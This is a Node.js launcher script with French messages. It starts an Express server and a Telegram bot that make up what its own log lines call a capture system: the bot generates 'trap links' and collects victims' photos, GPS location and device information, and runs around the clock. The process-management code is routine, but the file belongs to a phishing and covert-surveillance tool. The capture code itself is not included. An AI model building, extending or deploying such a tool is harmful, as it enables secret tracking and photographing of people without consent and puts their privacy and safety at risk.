const { spawn } = require("child_process");

console.log("🚀 Démarrage du système de capture Telegram...\n");

// Variables pour les processus
let serverProcess = null;
let botProcess = null;

// Fonction pour gérer proprement l'arrêt
function gracefulShutdown() {
    console.log("\n🛑 Arrêt du système...");
    if (botProcess) botProcess.kill();
    if (serverProcess) serverProcess.kill();
    setTimeout(() => process.exit(0), 2000);
}

// Gestionnaires de signaux
process.on("SIGINT", gracefulShutdown);
process.on("SIGTERM", gracefulShutdown);
process.on("uncaughtException", (err) => {
    console.error("❌ Exception non gérée:", err.message);
    gracefulShutdown();
});

// Démarrage du serveur Express
console.log("📡 Démarrage du serveur Express...");
serverProcess = spawn("node", ["app.js"], { stdio: "inherit" });

serverProcess.on("error", (err) => {
    console.error("❌ Erreur serveur Express:", err.message);
    process.exit(1);
});

serverProcess.on("exit", (code) => {
    if (code !== 0) {
        console.error(`❌ Serveur Express arrêté avec le code ${code}`);
        process.exit(1);
    }
});

// Attendre que le serveur démarre puis lancer le bot
setTimeout(() => {
    console.log("🤖 Démarrage du bot Telegram...");
    botProcess = spawn("node", ["telegrambot.js"], { stdio: "inherit" });

    botProcess.on("error", (err) => {
        console.error("❌ Erreur bot Telegram:", err.message);
        gracefulShutdown();
    });

    botProcess.on("exit", (code) => {
        if (code !== 0) {
            console.error(`❌ Bot Telegram arrêté avec le code ${code}`);
            gracefulShutdown();
        }
    });

    // Confirmation finale
    setTimeout(() => {
        console.log("\n✅ Système complet démarré !");
        console.log("📊 Keep-alive: Actif (immortel 24/7)");
        console.log("🔗 Bot: Prêt à générer des liens pièges");
        console.log("📸 Capture: Photos + GPS + Device Info");
        console.log("🎯 Commandes: /start, /generate, /data [ID]\n");
    }, 3000);
}, 2000);
